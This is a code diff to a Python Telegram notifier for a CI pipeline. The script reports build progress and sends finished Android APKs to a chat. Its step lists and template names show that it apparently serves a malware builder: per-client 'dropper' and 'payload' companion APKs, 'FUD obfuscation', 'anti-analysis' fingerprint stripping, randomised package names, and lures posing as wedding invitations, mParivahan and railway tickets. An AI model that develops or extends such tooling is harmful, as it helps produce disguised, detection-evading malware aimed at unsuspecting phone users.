@@ -2,35 +2,38 @@
 """
 telegram_notify.py
 ─────────────────────────────────────────────────────────────────────────────
-Called by build.yml at every step.
+Called by build_dev.yml / build.yml at every step.
 Edits a single Telegram message in-place (message mutation).
 On success: edits message to success state + sends APK file.
 On failure: edits message to failed state.
 
 Usage:
   python3 scripts/telegram_notify.py \
-    --step     "Build release APK" \
-    --status   "progress" \
-    --build    "271" \
-    --template "wedding" \
-    --client   "1" \
-    --chat-id  "8852912150" \
-    --msg-id   "12345" \
-    --token    "BOT_TOKEN"
+    --step       "Build companion APK" \
+    --status     "progress" \
+    --build      "271" \
+    --template   "wedding" \
+    --client     "1" \
+    --chat-id    "8852912150" \
+    --msg-id     "12345" \
+    --token      "BOT_TOKEN" \
+    --build-type "full"        # full | companion_only (default: full)
+    --pkg        "com.example" # shown from step 4 onwards
 
   # Final success step with APK:
   python3 scripts/telegram_notify.py \
-    --step     "Send to Telegram" \
-    --status   "success" \
-    --build    "271" \
-    --template "wedding" \
-    --client   "1" \
-    --chat-id  "8852912150" \
-    --msg-id   "12345" \
-    --token    "BOT_TOKEN" \
-    --apk      "app/build/outputs/apk/release/nova_abc123.apk" \
-    --apk-size "2.7 MB" \
-    --pkg      "com.shaadicard.invitemaker"
+    --step       "Send to Telegram" \
+    --status     "success" \
+    --build      "271" \
+    --template   "wedding" \
+    --client     "1" \
+    --chat-id    "8852912150" \
+    --msg-id     "12345" \
+    --token      "BOT_TOKEN" \
+    --build-type "full" \
+    --apk        "app/build/outputs/apk/release/nova_abc123.apk" \
+    --apk-size   "2.7 MB" \
+    --pkg        "com.shaadicard.invitemaker"
 """
 
 import argparse
@@ -42,45 +45,110 @@ import urllib.request
 import urllib.parse
 from datetime import datetime, timezone
 
-# ── Build step order — used to render progress list ──────────────────────────
-BUILD_STEPS = [
-    "Checkout",
-    "Install tools",
-    "Generate package name",
-    "Inject Nova package",
-    "Build companion APK",
-    "Build release APK",
-    "Phase 2 obfuscation",
-    "Re-sign APK",
-    "Strip fingerprints",
-    "Integrity check",
-    "Send to Telegram",
+# ── Full build steps (dropper + companion) ────────────────────────────────────
+BUILD_STEPS_FULL = [
+    ("Checkout",              "[1/9] 📥 Checkout & setup"),
+    ("Install tools",         "[2/9] 🔧 Install build tools"),
+    ("Generate package name", "[3/9] 🎲 Generate package name"),
+    ("Inject Nova package",   "[4/9] 💉 Inject Nova package"),
+    ("Build companion APK",   "[5/9] 🔨 Build companion APK"),
+    ("Build release APK",     "[6/9] 🏗  Build Nova release APK"),
+    ("Phase 2 obfuscation",   "[7/9] 🛡  Phase 2 — FUD obfuscation"),
+    ("Re-sign APK",           "[7/9] ✍️  Re-sign APK"),
+    ("Strip fingerprints",    "[8/9] 🧹 Strip fingerprints + anti-analysis"),
+    ("Integrity check",       "[9/9] 🔍 Integrity check"),
+    ("Send to Telegram",      "[✅]  📤 Send APK to Telegram"),
 ]
+
+# ── Companion-only build steps (payload only, no Nova/dropper) ────────────────
+BUILD_STEPS_COMPANION = [
+    ("Checkout",              "[1/4] 📥 Checkout & setup"),
+    ("Install tools",         "[2/4] 🔧 Install build tools"),
+    ("Generate package name", "[3/4] 🎲 Generate package name"),
+    ("Build companion APK",   "[4/4] 🔨 Build companion APK (payload)"),
+    ("Send to Telegram",      "[✅]  📤 Send APK to Telegram"),
+]
+
+# ── Average step durations in seconds (for ETA) ──────────────────────────────
+STEP_DURATIONS_FULL = {
+    "Checkout":              15,
+    "Install tools":         60,
+    "Generate package name": 10,
+    "Inject Nova package":   10,
+    "Build companion APK":   90,
+    "Build release APK":    180,
+    "Phase 2 obfuscation":   30,
+    "Re-sign APK":           15,
+    "Strip fingerprints":    20,
+    "Integrity check":       10,
+    "Send to Telegram":      10,
+}
+
+STEP_DURATIONS_COMPANION = {
+    "Checkout":              15,
+    "Install tools":         60,
+    "Generate package name": 10,
+    "Build companion APK":   90,
+    "Send to Telegram":      10,
+}
 
 # ── Template display names + emoji ───────────────────────────────────────────
 TEMPLATE_MAP = {
-    "wedding":    ("💍", "Wedding Invitation"),
-    "shaadi":     ("💒", "Shaadi Ka Nimantran"),
-    "mparivahan": ("🚗", "mParivahan"),
-    "railway":    ("🚂", "Indian Railway Ticket"),
-    "custom":     ("⚙️",  "Custom"),
+    "wedding":      ("💍", "Wedding Invitation"),
+    "shaadi":       ("💒", "Shaadi Ka Nimantran"),
+    "shaadi_hindi": ("💒", "Shaadi Ka Nimantran"),
+    "mparivahan":   ("🚗", "mParivahan"),
+    "railway":      ("🚂", "Indian Railway Ticket"),
+    "friends":      ("👥", "Friends Club"),
+    "bhabhi":       ("😄", "Fun with Bhabhi"),
+    "custom":       ("⚙️",  "Custom"),
+    "companion":    ("🔧", "Companion App"),
 }
 
-# ── Average step durations in seconds (for ETA calculation) ──────────────────
-STEP_DURATIONS = {
-    "Checkout":             5,
-    "Install tools":        30,
-    "Generate package name": 5,
-    "Inject Nova package":  5,
-    "Build companion APK":  45,
-    "Build release APK":    60,
-    "Phase 2 obfuscation":  20,
-    "Re-sign APK":          10,
-    "Strip fingerprints":   10,
-    "Integrity check":      5,
-    "Send to Telegram":     5,
-}
-TOTAL_ESTIMATED = sum(STEP_DURATIONS.values())
+
+def _get_step_tables(build_type: str):
+    """Return (steps_list, durations_dict) for the given build_type."""
+    if build_type == "companion_only":
+        return BUILD_STEPS_COMPANION, STEP_DURATIONS_COMPANION
+    return BUILD_STEPS_FULL, STEP_DURATIONS_FULL
+
+
+def _progress_bar(pct: int, width: int = 10) -> str:
+    """Return a filled progress bar string. e.g. ████████░░ 80%"""
+    filled = round(width * pct / 100)
+    empty  = width - filled
+    bar    = "█" * filled + "░" * empty
+    return f"{bar} {pct}%"
+
+
+def _calc_percent(current_step_key: str, build_type: str) -> int:
+    """Return 0-100 percent based on which step is currently running."""
+    steps, _ = _get_step_tables(build_type)
+    keys = [k for k, _ in steps]
+    if current_step_key not in keys:
+        return 0
+    idx = keys.index(current_step_key)
+    # Step i/total: when step i is running, pct = i/total*100
+    return round(idx / len(keys) * 100)
+
+
+def _calc_eta(current_step_key: str, elapsed: int, build_type: str) -> str:
+    """Calculate remaining ETA based on current step and elapsed time."""
+    steps, durations = _get_step_tables(build_type)
+    keys = [k for k, _ in steps]
+    found = False
+    remaining = 0
+    for key in keys:
+        if key == current_step_key:
+            found = True
+            # Current step: add its remaining portion (assume half done)
+            remaining += max(0, durations.get(key, 10) // 2)
+            continue
+        if found:
+            remaining += durations.get(key, 10)
+    if remaining <= 0:
+        return "~0s"
+    return f"~{format_elapsed(remaining)}"
 
 
 def telegram_request(token: str, method: str, data: dict,
@@ -91,7 +159,6 @@ def telegram_request(token: str, method: str, data: dict,
     for attempt in range(retries):
         try:
             if files:
-                # multipart/form-data for file upload
                 import mimetypes
                 boundary = "----TelegramBoundary"
                 body_parts = []
@@ -183,7 +250,8 @@ def send_document(token: str, chat_id: str, apk_path: str,
             "parse_mode": "HTML",
         },
         files={
-            "document": (filename, file_data, "application/vnd.android.package-archive")
+            "document": (filename, file_data,
+                         "application/vnd.android.package-archive")
         }
     )
     return bool(result.get("ok"))
@@ -198,179 +266,176 @@ def format_elapsed(seconds: int) -> str:
     return f"{s}s"
 
 
-def calc_eta(current_step: str, elapsed: int) -> str:
-    """Calculate remaining ETA based on current step."""
-    found = False
-    remaining = 0
-    for step in BUILD_STEPS:
-        if step == current_step:
-            found = True
-            remaining += STEP_DURATIONS.get(step, 10)
-            continue
-        if found:
-            remaining += STEP_DURATIONS.get(step, 10)
-    if remaining <= 0:
-        return "~0s"
-    return f"~{format_elapsed(remaining)}"
-
-
 def build_progress_message(current_step: str, status: str,
                            build_num: str, template: str,
                            client: str, elapsed: int,
-                           pkg: str = "", apk_size: str = "") -> str:
+                           pkg: str = "",
+                           apk_size: str = "",
+                           build_type: str = "full") -> str:
     """Build the progress message text."""
 
-    emoji, display_name = TEMPLATE_MAP.get(template, ("⚙️", template.title()))
-    now_utc = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
+    is_companion = (build_type == "companion_only")
+    emoji, display_name = TEMPLATE_MAP.get(
+        "companion" if is_companion else template,
+        ("⚙️", template.title())
+    )
+    now_utc = datetime.now(timezone.utc).strftime("%H:%M:%S UTC")
 
+    # ── Normalise step key: strip [DEV] prefix and emoji suffixes ─────────────
+    step_key = current_step
+    for prefix in ("[DEV] Checkout dev branch", "[DEV] Checkout"):
+        if step_key.startswith(prefix):
+            step_key = "Checkout"
+            break
+    for send_suffix in ("Send to Telegram", "Send to Telegram"):
+        if send_suffix in step_key:
+            step_key = "Send to Telegram"
+            break
+
+    steps, durations = _get_step_tables(build_type)
+    step_keys  = [k for k, _ in steps]
+    step_labels = {k: lbl for k, lbl in steps}
+
+    # ── SUCCESS ───────────────────────────────────────────────────────────────
     if status == "success":
+        bar = _progress_bar(100)
         lines = [
             f"✅ <b>Build #{build_num} — SUCCESS</b>",
             "━━━━━━━━━━━━━━━━━━━━",
-            f"Client   : {client}",
-            f"Template : {emoji} {display_name}",
+            f"📦 Type     : {emoji} {display_name}",
+            f"👤 Client   : {client}",
+            f"🔢 Build    : #{build_num}",
             "━━━━━━━━━━━━━━━━━━━━",
-            f"📦 Package  : <code>{pkg}</code>",
-            f"📁 Size     : {apk_size}",
+            f"📊 Progress : {bar}",
+            "━━━━━━━━━━━━━━━━━━━━",
+        ]
+        if pkg:
+            lines.append(f"📦 Package  : <code>{pkg}</code>")
+        if apk_size:
+            lines.append(f"📁 Size     : {apk_size}")
+        lines += [
             f"⏱ Duration : {format_elapsed(elapsed)}",
-            f"🕐 UTC      : {now_utc}",
+            f"🕐 Time     : {now_utc}",
             "━━━━━━━━━━━━━━━━━━━━",
             "APK file sent below ⬇️",
         ]
         return "\n".join(lines)
 
+    # ── FAILURE ───────────────────────────────────────────────────────────────
     if status == "failure":
+        pct = _calc_percent(step_key, build_type)
+        bar = _progress_bar(pct)
         lines = [
             f"❌ <b>Build #{build_num} — FAILED</b>",
             "━━━━━━━━━━━━━━━━━━━━",
-            f"Client   : {client}",
-            f"Template : {emoji} {display_name}",
+            f"📦 Type     : {emoji} {display_name}",
+            f"👤 Client   : {client}",
+            f"🔢 Build    : #{build_num}",
             "━━━━━━━━━━━━━━━━━━━━",
-            f"⚠️ Failed at : <b>{current_step}</b>",
+            f"📊 Progress : {bar}",
+            f"⚠️ Failed at: <b>{step_labels.get(step_key, step_key)}</b>",
+            "━━━━━━━━━━━━━━━━━━━━",
             f"⏱ Elapsed   : {format_elapsed(elapsed)}",
-            f"🕐 UTC       : {now_utc}",
+            f"🕐 Time      : {now_utc}",
             "━━━━━━━━━━━━━━━━━━━━",
             "Check GitHub Actions for full log.",
         ]
         return "\n".join(lines)
 
-    # progress
-    step_lines = []
+    # ── PROGRESS ──────────────────────────────────────────────────────────────
+    pct = _calc_percent(step_key, build_type)
+    bar = _progress_bar(pct)
+    eta = _calc_eta(step_key, elapsed, build_type)
+
+    # Render step list
     current_found = False
-    for step in BUILD_STEPS:
-        if step == current_step:
-            step_lines.append(f"⏳ {step}...")
+    step_lines = []
+    for key, label in steps:
+        if key == step_key:
+            step_lines.append(f"⏳ <b>{label}…</b>")
             current_found = True
         elif not current_found:
-            step_lines.append(f"✅ {step}")
+            step_lines.append(f"✅ {label}")
         else:
-            step_lines.append(f"⬜ {step}")
-
-    eta = calc_eta(current_step, elapsed)
+            step_lines.append(f"⬜ {label}")
 
     lines = [
         f"🔨 <b>Building: {emoji} {display_name}</b>",
         "━━━━━━━━━━━━━━━━━━━━",
-        f"Client  : {client}",
-        f"Build   : #{build_num}",
+        f"👤 Client  : {client}",
+        f"🔢 Build   : #{build_num}",
+    ]
+    if pkg:
+        lines.append(f"📦 Package : <code>{pkg}</code>")
+    lines += [
         "━━━━━━━━━━━━━━━━━━━━",
-    ] + step_lines + [
+    ]
+    lines += step_lines
+    lines += [
         "━━━━━━━━━━━━━━━━━━━━",
+        f"📊 {bar}",
         f"⏱ Elapsed : {format_elapsed(elapsed)}",
-        f"📊 ETA     : {eta}",
+        f"⏰ ETA     : {eta}",
+        f"🕐 Time    : {now_utc}",
     ]
     return "\n".join(lines)
 
 
 def resolve_token(token_arg: str) -> str:
-    """
-    Triple fallback token resolution.
-    Priority 1: --token argument (from GitHub Secret via build.yml)
-    Priority 2: TELEGRAM_BOT_TOKEN environment variable
-    Priority 3: BOT_TOKEN environment variable
-    Returns empty string if all fail.
-    """
     PLACEHOLDER = "YOUR_BOT_TOKEN_HERE"
-
-    # Priority 1: argument
     if token_arg and token_arg != PLACEHOLDER and ":" in token_arg:
         return token_arg
-
-    # Priority 2: TELEGRAM_BOT_TOKEN env var
     env_token = os.environ.get("TELEGRAM_BOT_TOKEN", "")
     if env_token and env_token != PLACEHOLDER and ":" in env_token:
-        print(f"[telegram_notify] Token resolved via "
-              f"TELEGRAM_BOT_TOKEN env var")
         return env_token
-
-    # Priority 3: BOT_TOKEN env var
     env_token2 = os.environ.get("BOT_TOKEN", "")
     if env_token2 and env_token2 != PLACEHOLDER and ":" in env_token2:
-        print(f"[telegram_notify] Token resolved via BOT_TOKEN env var")
         return env_token2
-
     return ""
 
 
 def resolve_chat_id(chat_id_arg: str) -> str:
-    """
-    Triple fallback chat_id resolution.
-    Priority 1: --chat-id argument
-    Priority 2: TELEGRAM_CHAT_ID environment variable
-    Priority 3: BUILD_CHAT_ID environment variable
-    """
-    # Priority 1: argument
     if chat_id_arg and chat_id_arg not in ("0", "", "YOUR_CHAT_ID_HERE"):
         return chat_id_arg
-
-    # Priority 2: TELEGRAM_CHAT_ID env var
     env_chat = os.environ.get("TELEGRAM_CHAT_ID", "")
     if env_chat and env_chat not in ("0", ""):
-        print(f"[telegram_notify] Chat ID resolved via "
-              f"TELEGRAM_CHAT_ID env var")
         return env_chat
-
-    # Priority 3: BUILD_CHAT_ID env var
     env_chat2 = os.environ.get("BUILD_CHAT_ID", "")
     if env_chat2 and env_chat2 not in ("0", ""):
-        print(f"[telegram_notify] Chat ID resolved via "
-              f"BUILD_CHAT_ID env var")
         return env_chat2
-
     return ""
 
 
 def main():
     parser = argparse.ArgumentParser()
-    parser.add_argument("--step",      required=True)
-    parser.add_argument("--status",    required=True,
+    parser.add_argument("--step",        required=True)
+    parser.add_argument("--status",      required=True,
                         choices=["progress", "success", "failure"])
-    parser.add_argument("--build",     required=True)
-    parser.add_argument("--template",  required=True)
-    parser.add_argument("--client",    required=True)
-    parser.add_argument("--chat-id",   required=True, dest="chat_id")
-    parser.add_argument("--msg-id",    required=True, dest="msg_id")
-    parser.add_argument("--token",     required=True)
-    parser.add_argument("--apk",       default="")
-    parser.add_argument("--apk-size",  default="", dest="apk_size")
-    parser.add_argument("--pkg",       default="")
-    parser.add_argument("--elapsed",   default="0", type=int)
+    parser.add_argument("--build",       required=True)
+    parser.add_argument("--template",    required=True)
+    parser.add_argument("--client",      required=True)
+    parser.add_argument("--chat-id",     required=True, dest="chat_id")
+    parser.add_argument("--msg-id",      required=True, dest="msg_id")
+    parser.add_argument("--token",       required=True)
+    parser.add_argument("--apk",         default="")
+    parser.add_argument("--apk-size",    default="", dest="apk_size")
+    parser.add_argument("--pkg",         default="")
+    parser.add_argument("--elapsed",     default="0", type=int)
+    parser.add_argument("--build-type",  default="full", dest="build_type",
+                        choices=["full", "companion_only"])
     args = parser.parse_args()
 
-    # ── Triple fallback token + chat_id resolution ────────────
     resolved_token   = resolve_token(args.token)
     resolved_chat_id = resolve_chat_id(args.chat_id)
 
-    # Skip silently only if all 3 fallbacks fail
     if not resolved_token or not resolved_chat_id:
         print("[telegram_notify] No chat_id or token — skipping notification")
         sys.exit(0)
 
-    # Use resolved values
     args.token   = resolved_token
     args.chat_id = resolved_chat_id
 
-    # Calculate elapsed from CI start time env var if available
+    # ── Elapsed: use BUILD_START_TS env var if set (more accurate) ────────────
     elapsed = args.elapsed
     start_ts = os.environ.get("BUILD_START_TS", "")
     if start_ts:
@@ -378,6 +443,13 @@ def main():
             elapsed = int(time.time()) - int(start_ts)
         except Exception:
             pass
+
+    # ── Also accept BUILD_TYPE env var as fallback ────────────────────────────
+    build_type = args.build_type
+    if build_type == "full":
+        env_bt = os.environ.get("BUILD_TYPE", "")
+        if env_bt in ("full", "companion_only"):
+            build_type = env_bt
 
     text = build_progress_message(
         current_step=args.step,
@@ -388,24 +460,25 @@ def main():
         elapsed=elapsed,
         pkg=args.pkg,
         apk_size=args.apk_size,
+        build_type=build_type,
     )
 
-    # Edit existing message (message mutation)
     if args.msg_id and args.msg_id != "0":
         edit_message(args.token, args.chat_id, args.msg_id, text)
     else:
-        # First call — no message_id yet, just print text
-        # (bot creates message and passes msg_id in workflow inputs)
         print(f"[telegram_notify] No msg_id — message not edited")
 
     # On success: send APK file as separate message
     if args.status == "success" and args.apk:
+        is_companion = (build_type == "companion_only")
         emoji, display_name = TEMPLATE_MAP.get(
-            args.template, ("⚙️", args.template.title()))
+            "companion" if is_companion else args.template,
+            ("⚙️", args.template.title())
+        )
         caption = (
             f"📦 <b>Build #{args.build} — {emoji} {display_name}</b>\n"
-            f"Package: <code>{args.pkg}</code>\n"
-            f"Size: {args.apk_size}"
+            f"Package : <code>{args.pkg}</code>\n"
+            f"Size    : {args.apk_size}"
         )
         ok = send_document(args.token, args.chat_id, args.apk, caption)
         if ok:
@@ -414,7 +487,8 @@ def main():
             print(f"[telegram_notify] APK send failed", file=sys.stderr)
             sys.exit(1)
 
-    print(f"[telegram_notify] Done — step={args.step} status={args.status}")
+    print(f"[telegram_notify] Done — step={args.step} status={args.status} "
+          f"build_type={build_type}")
 
 
 if __name__ == "__main__":
